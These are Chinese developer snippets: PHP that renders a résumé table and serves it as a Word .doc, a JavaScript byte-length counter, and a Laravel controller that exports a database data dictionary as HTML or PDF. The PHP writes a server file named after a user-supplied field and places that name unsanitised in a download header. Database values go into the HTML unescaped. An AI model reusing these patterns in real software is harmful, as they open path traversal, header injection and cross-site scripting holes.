            $html ='<table width=800  align="center"  border="1" cellpadding="0" cellspacing="1" >
    <tr height="50"> 
      <td width=70 > 姓名</td> 
      <td width=300 >  '.$re['u_name'].'</td> 
      <td width=60 >性别</td> 
      <td width=100 >'.$re['g_sex'].'</td> 
      <td width=100 >学历</td> 
      <td width=240 >'.$re['school_type'].'</td> 
    </tr> 
    <tr> 
      <td width=70 >工作时间</td> 
      <td width=40 >'.$re['work_year'].'</td> 
      <td width=40 >毕业<br/>学校</td> 
      <td width=150 >'.$re['g_school'].'</td> 
      <td width=40 >所在<br/>城市</td> 
      <td width=390 >'.$re['city_name'].'</td> 
    </tr> 
    <tr> 
      <td width=110 >联系邮箱</td> 
      <td width=200 >'.$re['work_email'].'</td> 
      <td width=110 >联系<br/>电话</td> 
      <td width=280 >'.$re['work_phone'].'</td>
      <td width=110 >当前<br/>状态</td> 
      <td width=280 >'.$re['work_type'].'</td>
    </tr> 
    <tr> 
      <td width=120 ><br/><br/>教育<br/>背景<br/><br/></td> 
      <td width=580 >'.$re['edutation'].'</td>     
    </tr> 
    <tr> 
      <td width=120 ><br/><br/>工作<br/>经历<br/><br/></td> 
      <td width=580 >'.$re['g_workj'].'</td>     
    </tr> 
    <tr> 
      <td width=120 ><br/><br/><br/>作品<br/>展示<br/><br/><br/><br/></td> 
      <td width=580 >'.$re['g_zuo'].'</td> 
    </tr> 
    </table> <br/><br/><br/><br/>
';
 
 // print_r($html);die;
     // $word->start();
     
     ob_start();
        echo "<html xmlns:o='urn:schemas-microsoft-com:office:office'
        xmlns:w='urn:schemas-microsoft-com:office:word'
        xmlns='http://www.w3.org/TR/REC-html40'>";
     
     echo $html;
     echo "</html>";
      // $word->save($filename);
      $data = ob_get_contents();
      // print_r($data);die;
      // die;
        ob_end_clean();
        $filename = $re['u_name'].'.doc';
        $fp=fopen($filename,"wb");
        fwrite($fp,$data);
        fclose($fp);
      //文件的类型
      header('Content-type: application/word');
      header("Content-Disposition: attachment; filename=".$filename);
      readfile($filename);
      ob_flush();
      flush();
     exit();
    
    }
```
中文占2字节
```js
function getByteLen(val){    //传入一个字符串
            var len = 0;
            for (var i = 0; i < val.length; i++) {
                if (/^([\u4E00-\u9FA5]+，?)+$/.test(val[i])) //全角
                    len += 2; //如果是全角，占用两个字节
                else
                    len += 1; //半角占用一个字节
            }
            return len;
         }
```

[laravel 在线数据库字典导出](http://github.com/jormin/laravel-ddoc)

```js
namespace Jormin\DDoc\Controllers;

use App\Http\Controllers\Controller;
use Barryvdh\Snappy\Facades\SnappyPdf;
use Illuminate\Http\Response;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Request;
use Illuminate\Support\Facades\View;

class DDocController extends Controller
{

    /**
     * 读取数据库信息
     */
    private function initTablesData()
    {
        //获取数据库表名称列表
        $tables = DB::select('SHOW TABLE STATUS ');
        foreach ($tables as $key => $table) {
            //获取改表的所有字段信息
            $columns = DB::select("SHOW FULL FIELDS FROM ".$table->Name);
            $table->columns = $columns;
            $tables[$key] = $table;
        }
        return $tables;
    }

    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        $tables = $this->initTablesData();
        return view('ddoc::index',compact('tables'));
    }

    /**
     * 导出文档
     *
     * @param $type
     */
    public function export($type)
    {
        if(!in_array($type,array('html','pdf'))){
            return null;
        }
        $tables = $this->initTablesData();
        $filename = config('app.name').'数据字典';
        switch($type){
            case 'html':
                $zippath = __DIR__.'/'.$filename.'.zip';
                $zip = new \ZipArchive;
                $res = $zip->open($zippath, \ZipArchive::CREATE);
                if ($res === TRUE) {
                    // 添加静态资源文件
                    $this->addFileToZip('vendor/laravel-ddoc',$zip);
                    // 生成Html文件
                    require_once (__DIR__.'/../Lib/simple_html_dom.php');
                    $obj = View::make('ddoc::index', compact('tables'),array())->render();
                    $protocol = 'http://';
                    if(Request::secure()){
                        $protocol = 'https://';
                    }
                    $obj = str_replace($protocol.$_SERVER['HTTP_HOST'].'/vendor/laravel-ddoc','.',$obj);
                    $html = new \simple_html_dom();
                    $html->load($obj);
                    $html->find('div[class=export-wrap]',0)->outertext = '';
                    $zip->addFromString($filename.'.html', $html);
                    $zip->close();
                } else {
                    return null;
                }

                $response =  new Response(file_get_contents($zippath), 200, array(
                    'Content-Type' => 'application/zip',
                    'Content-Disposition' =>  'attachment; filename="'.$filename.'.zip"'
                ));
                unlink($zippath);
                return $response;
                break;
            case 'pdf':
                $filename .= '.pdf';
                $pdf = SnappyPdf::loadView('ddoc::index', compact('tables'));
                return $pdf->download($filename);
                break;
        }
    }

    /**
     * 添加文件夹
     *
     * @param $path
     * @param $zip
     */
    private function addFileToZip($path, $zip) {
        $handler = opendir(public_path($path));
        while (($filename = readdir($handler)) !== false) {
            if (!in_array($filename,array('.','..','.DS_Store'))) {
                if (is_dir($path . "/" . $filename)) {
                    $this->addFileToZip($path . "/" . $filename, $zip);
                } else { //将文件加入zip对象
                    $fullname = public_path($path) . "/" . $filename;
                    $localname = str_replace('vendor/laravel-ddoc/','','/'.$path.'/'.$filename);
                    $zip->addFile($fullname,$localname);
                }
            }
        }
        @closedir($path);
    }
}
```

